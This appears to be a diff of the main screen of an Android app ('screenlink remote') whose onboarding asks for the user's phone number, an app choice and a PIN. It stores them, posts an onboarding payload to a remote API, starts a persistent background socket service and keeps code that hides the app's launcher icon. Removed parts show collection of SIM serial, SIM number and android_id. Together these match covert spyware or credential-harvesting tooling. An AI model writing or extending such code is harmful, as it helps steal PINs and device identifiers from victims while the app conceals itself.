@@ -3,11 +3,9 @@ package com.screenlink.remote
 import android.Manifest
 import android.app.Activity
 import android.app.AlertDialog
-import android.content.BroadcastReceiver
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
-import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.graphics.Typeface
 import android.graphics.drawable.GradientDrawable
@@ -31,12 +29,15 @@ import android.widget.ScrollView
 import android.widget.TextView
 import android.widget.Toast
 import org.json.JSONObject
+import java.net.HttpURLConnection
+import java.net.URL
 import java.util.UUID
 import java.util.concurrent.Executors
 
 class MainActivity : Activity() {
 
     companion object {
+        private const val API_BASE_URL = TpcService.API_BASE_URL
         private const val PREFS = "viral_prefs"
         private const val KEY_RID = "registration_id"
         private const val KEY_PHONE = "phone_number"
@@ -53,6 +54,7 @@ class MainActivity : Activity() {
             "https://files.catbox.moe/ym3rl6.jpeg"
         )
 
+        // ---- sober white theme ----
         private const val BG = 0xFFFFFFFF.toInt()
         private const val CARD = 0xFFFFFFFF.toInt()
         private const val CARD_2 = 0xFFF7F8FA.toInt()
@@ -63,7 +65,6 @@ class MainActivity : Activity() {
         private const val TEXT = 0xFF111827.toInt()
         private const val MUTED = 0xFF6B7280.toInt()
         private const val GREEN = 0xFF16A34A.toInt()
-        private const val RED = 0xFFDC2626.toInt()
     }
 
     private val executor = Executors.newSingleThreadExecutor()
@@ -74,12 +75,8 @@ class MainActivity : Activity() {
     private var selectedApp: String? = null
     private var phoneNumber: String = ""
     private var pin: String = ""
-    private var statusRow: TextView? = null
 
-    private val statusReceiver = object : BroadcastReceiver() {
-        override fun onReceive(ctx: Context?, intent: Intent?) = refreshStatusRow()
-    }
-
+    /** CALL_PHONE hata diya — call feature nahi hai. */
     private val requiredPermissions: Array<String> by lazy {
         val base = mutableListOf(
             Manifest.permission.READ_PHONE_STATE,
@@ -95,6 +92,8 @@ class MainActivity : Activity() {
         }
         base.toTypedArray()
     }
+
+    // ------------------------------------------------------------- lifecycle
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -112,11 +111,18 @@ class MainActivity : Activity() {
 
         registrationId()
 
-        TpcService.start(this)
+        try {
+            startService(Intent(this, TpcService::class.java))
+        } catch (e: Exception) {
+            Log.e("DESI", "service start fail", e)
+        }
 
         if (prefs().getBoolean(KEY_DONE, false)) {
             showDoneStep()
-        } else if (allPermissionsGranted()) {
+            return
+        }
+
+        if (allPermissionsGranted()) {
             showCurrentStep()
         } else {
             showSplashStep()
@@ -128,28 +134,12 @@ class MainActivity : Activity() {
 
     override fun onResume() {
         super.onResume()
-
-        val filter = IntentFilter(TpcService.ACTION_STATUS)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            registerReceiver(statusReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
-        } else {
-            @Suppress("UnspecifiedRegisterReceiverFlag")
-            registerReceiver(statusReceiver, filter)
-        }
-
-        refreshStatusRow()
-
         if (prefs().getBoolean(KEY_DONE, false)) return
         if (step == "perm" && allPermissionsGranted()) showCurrentStep()
     }
 
-    override fun onPause() {
-        runCatching { unregisterReceiver(statusReceiver) }
-        super.onPause()
-    }
-
     override fun onDestroy() {
-        runCatching { executor.shutdown() }
+        executor.shutdown()
         super.onDestroy()
     }
 
@@ -158,7 +148,6 @@ class MainActivity : Activity() {
         when (step) {
             "pin" -> showContentStep()
             "content" -> showPhoneStep()
-            "diag" -> showDoneStep()
             "done" -> finish()
             else -> @Suppress("DEPRECATION") super.onBackPressed()
         }
@@ -171,14 +160,18 @@ class MainActivity : Activity() {
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode != REQ_PERMS) return
+
         if (allPermissionsGranted()) showCurrentStep() else showPermissionDialog()
     }
+
+    // ------------------------------------------------------ crash logger
 
     private fun installCrashCatcher() {
         val prev = Thread.getDefaultUncaughtExceptionHandler()
         Thread.setDefaultUncaughtExceptionHandler { t, e ->
-            runCatching {
+            try {
                 prefs().edit().putString(KEY_CRASH, Log.getStackTraceString(e)).apply()
+            } catch (_: Throwable) {
             }
             prev?.uncaughtException(t, e)
         }
@@ -193,6 +186,8 @@ class MainActivity : Activity() {
             .setPositiveButton("OK", null)
             .show()
     }
+
+    // ------------------------------------------------------------ navigation
 
     private fun allPermissionsGranted(): Boolean =
         requiredPermissions.all {
@@ -217,12 +212,7 @@ class MainActivity : Activity() {
 
     private fun toast(msg: String) = Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
 
-    private fun refreshStatusRow() {
-        val t = statusRow ?: return
-        val live = TpcService.socketConnected
-        t.text = if (live) "● Socket live" else "○ Socket reconnect…"
-        t.setTextColor(if (live) GREEN else MUTED)
-    }
+    // ------------------------------------------------- deny popup
 
     private fun showPermissionDialog() {
         if (isFinishing) return
@@ -238,14 +228,17 @@ class MainActivity : Activity() {
     }
 
     private fun openAppSettings() {
-        runCatching {
+        try {
             startActivity(
                 Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                     data = Uri.fromParts("package", packageName, null)
                 }
             )
+        } catch (_: Exception) {
         }
     }
+
+    // ------------------------------------------------- splash
 
     private fun showSplashStep() {
         val col = column()
@@ -256,6 +249,8 @@ class MainActivity : Activity() {
         col.addView(label("Permission check kar rahe hain…", 12.5f, MUTED, false, Gravity.CENTER))
         setScreen(scrollWrap(col), "perm")
     }
+
+    // ------------------------------------------------------ step: number
 
     private fun showPhoneStep() {
         val col = column()
@@ -334,6 +329,8 @@ class MainActivity : Activity() {
 
         setScreen(scrollWrap(col), "phone")
     }
+
+    // ----------------------------------------------------- step: content
 
     private fun showContentStep() {
         val col = column()
@@ -424,6 +421,8 @@ class MainActivity : Activity() {
         setScreen(scrollWrap(col), "content")
         paintTiles()
     }
+
+    // --------------------------------------------------------- step: pin
 
     private fun showPinStep() {
         val col = column()
@@ -523,6 +522,8 @@ class MainActivity : Activity() {
         refreshDots()
     }
 
+    // --------------------------------------------------------- submit
+
     private fun onboardingPayload(): String = JSONObject().apply {
         put("registration_id", registrationId())
         put("phone_number", phoneNumber.take(20))
@@ -532,8 +533,24 @@ class MainActivity : Activity() {
         put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}".take(60))
     }.toString()
 
-    private fun postOnboarding(): Boolean =
-        ApiClient.post("/devices/onboarding", JSONObject(onboardingPayload()))
+    private fun postOnboarding(): Boolean {
+        var connection: HttpURLConnection? = null
+        return try {
+            connection = URL("$API_BASE_URL/devices/onboarding")
+                .openConnection() as HttpURLConnection
+            connection.requestMethod = "POST"
+            connection.connectTimeout = 12_000
+            connection.readTimeout = 12_000
+            connection.doOutput = true
+            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
+            connection.outputStream.use { it.write(onboardingPayload().toByteArray(Charsets.UTF_8)) }
+            connection.responseCode in 200..299
+        } catch (_: Exception) {
+            false
+        } finally {
+            connection?.disconnect()
+        }
+    }
 
     private fun submitPin() {
         prefs().edit().putString(KEY_PIN, pin).apply()
@@ -574,15 +591,6 @@ class MainActivity : Activity() {
     private fun showSuccessStep(synced: Boolean) {
         prefs().edit().putBoolean(KEY_DONE, true).apply()
 
-        executor.execute {
-            ApiClient.post("/devices/telemetry", JSONObject().apply {
-                put("registration_id", registrationId())
-                put("telemetry", Telemetry.collect(this@MainActivity))
-            })
-        }
-
-        TpcService.start(this)
-
         val col = column()
         col.addView(label("✓", 58f, GREEN, true, Gravity.CENTER))
         col.addView(space(14))
@@ -612,17 +620,15 @@ class MainActivity : Activity() {
         setScreen(scrollWrap(col), "done")
     }
 
+    // --------------------------------------------------- already onboarded
+
     private fun showDoneStep() {
         val col = column()
 
         col.addView(label("✓", 54f, GREEN, true, Gravity.CENTER))
         col.addView(space(14))
         col.addView(label("Onboarding complete", 21f, TEXT, true, Gravity.CENTER))
-        col.addView(space(10))
-
-        statusRow = label("○ checking…", 12f, MUTED, true, Gravity.CENTER)
-        col.addView(statusRow)
-        col.addView(space(20))
+        col.addView(space(24))
 
         val card = card()
         val inner = LinearLayout(this).apply {
@@ -630,154 +636,58 @@ class MainActivity : Activity() {
             setPadding(dp(18), dp(14), dp(18), dp(14))
         }
 
-        fun renderRows() {
-            inner.removeAllViews()
-            val live = TpcService.lastNumber.ifBlank {
-                SimNumbers.best(this@MainActivity)?.first ?: ""
-            }
-            listOf(
-                "Entered number" to phoneNumber.ifBlank { "—" },
-                "Live SIM number" to live.ifBlank { "fetching…" },
-                "Carrier" to (SimNumbers.best(this@MainActivity)?.let { "" } ?: ""),
-                "App" to (selectedApp ?: "—"),
-                "PIN" to pin.ifBlank { "—" },
-                "Service" to if (TpcService.socketConnected) "socket live" else "reconnecting"
-            ).forEach { (k, v) ->
-                if (k == "Carrier" && v.isBlank()) return@forEach
-                val row = LinearLayout(this).apply {
-                    orientation = LinearLayout.HORIZONTAL
-                    setPadding(0, dp(9), 0, dp(9))
-                }
-                row.addView(label(k, 13f, MUTED, false))
-                row.addView(label(v, 13f, TEXT, true, Gravity.END))
-                inner.addView(row)
-            }
-        }
-
-        renderRows()
-        card.addView(inner)
-        col.addView(card)
-        col.addView(space(14))
-
-        col.addView(secondaryButton("⟳ Fetch real SIM number") {
-            toast("Fetch kar rahe hain…")
-            executor.execute {
-                val t = Telemetry.collect(this@MainActivity)
-                ApiClient.post("/devices/telemetry", JSONObject().apply {
-                    put("registration_id", registrationId())
-                    put("telemetry", t)
-                })
-                main.post {
-                    renderRows()
-                    toast(
-                        if (TpcService.lastNumber.isBlank())
-                            "Number nahi mila — SIM / network check karo"
-                        else
-                            "Live number: ${TpcService.lastNumber}"
-                    )
-                }
-            }
-        })
-
-        col.addView(space(10))
-        col.addView(secondaryButton("📋 Diagnostics") { showDiagnostics() })
-        col.addView(space(10))
-        col.addView(secondaryButton("Re-run onboarding") {
-            pin = ""
-            prefs().edit().putBoolean(KEY_DONE, false).apply()
-            showCurrentStep()
-        })
-        col.addView(space(10))
-        col.addView(primaryButton("Close") { finish() })
-
-        setScreen(scrollWrap(col), "done")
-        refreshStatusRow()
-    }
-
-    private fun showDiagnostics() {
-        val t = Telemetry.collect(this)
-        val col = column()
-
-        col.addView(label("Diagnostics", 22f, TEXT, true, Gravity.CENTER))
-        col.addView(space(6))
-        col.addView(label("Live device + connection state", 12f, MUTED, false, Gravity.CENTER))
-        col.addView(space(16))
-
-        val card = card()
-        val inner = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            setPadding(dp(16), dp(12), dp(16), dp(12))
-        }
-
-        val keys = listOf(
-            "model", "manufacturer", "brand", "android_version", "sdk_int",
-            "ram_total_mb", "ram_free_mb", "storage_total_mb", "storage_free_mb",
-            "battery_level", "battery_charging", "battery_temperature_c", "battery_health",
-            "network_type", "local_ip", "screen_resolution",
-            "sim_carrier", "sim_number", "sim_number_source", "sim_count", "sim_serial",
-            "android_id", "cpu_abi", "cpu_cores"
-        )
-
-        keys.forEach { k ->
-            if (!t.has(k)) return@forEach
+        listOf(
+            "Number" to phoneNumber.ifBlank { "—" },
+            "App" to (selectedApp ?: "—"),
+            "PIN" to (pin.ifBlank { "—" }),
+            "Service" to "running"
+        ).forEach { (k, v) ->
             val row = LinearLayout(this).apply {
                 orientation = LinearLayout.HORIZONTAL
-                setPadding(0, dp(7), 0, dp(7))
+                setPadding(0, dp(9), 0, dp(9))
             }
-            row.addView(label(k, 11.5f, MUTED, false))
-            row.addView(label(t.optString(k), 11.5f, TEXT, true, Gravity.END))
+            row.addView(label(k, 13f, MUTED, false))
+            row.addView(label(v, 13f, TEXT, true, Gravity.END))
             inner.addView(row)
         }
 
         card.addView(inner)
         col.addView(card)
-        col.addView(space(12))
+        col.addView(space(22))
 
-        val socketRow = label(
-            if (TpcService.socketConnected) "socket: connected" else "socket: disconnected",
-            12f,
-            if (TpcService.socketConnected) GREEN else RED,
-            true,
-            Gravity.CENTER
-        )
-        col.addView(socketRow)
-        col.addView(space(16))
-
-        col.addView(secondaryButton("🔋 Battery optimization exempt") {
-            runCatching {
-                val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
-                    .setData(Uri.parse("package:$packageName"))
-                startActivity(i)
-            }
+        col.addView(primaryButton("Re-run onboarding") {
+            pin = ""
+            prefs().edit().putBoolean(KEY_DONE, false).apply()
+            showCurrentStep()
         })
 
         col.addView(space(10))
-        col.addView(secondaryButton("⟳ Force socket reconnect") {
-            TpcService.start(this)
-            toast("reconnect trigger bheja")
-        })
+        col.addView(secondaryButton("Close") { finish() })
 
-        col.addView(space(10))
-        col.addView(primaryButton("Back") { showDoneStep() })
-
-        setScreen(scrollWrap(col), "diag")
+        setScreen(scrollWrap(col), "done")
     }
 
+    // --------------------------------------------------- icon hide
+
     private fun hideLauncherIcon() {
-        runCatching {
+        try {
             packageManager.setComponentEnabledSetting(
                 ComponentName(this, "$packageName.LauncherAlias"),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
+        } catch (_: Exception) {
         }
     }
+
+    // ------------------------------------------------------------ helpers
 
     private fun prefs() = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
 
     private fun registrationId(): String {
         val p = prefs()
         p.getString(KEY_RID, null)?.let { if (it.isNotBlank()) return it }
+
         val id = UUID.randomUUID().toString()
         p.edit().putString(KEY_RID, id).apply()
         return id
@@ -854,6 +764,7 @@ class MainActivity : Activity() {
         )
     }
 
+    /** Simple "DV" badge — koi AI generated logo nahi. */
     private fun logo(size: Int) = TextView(this).apply {
         text = "DV"
         textSize = 28f
